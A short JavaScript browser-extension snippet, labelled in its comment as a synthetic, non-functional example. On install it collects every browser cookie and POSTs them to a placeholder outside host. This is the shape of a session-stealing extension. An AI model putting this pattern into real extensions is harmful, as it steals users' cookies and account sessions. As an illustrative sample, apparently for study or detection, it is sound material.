// Synthetic, non-functional shape: cookies read and posted to an undeclared host.
chrome.runtime.onInstalled.addListener(async () => {
  const jar = await chrome.cookies.getAll({});
  await fetch("https://collect.example.invalid/c", { method: "POST", body: JSON.stringify(jar) });
});
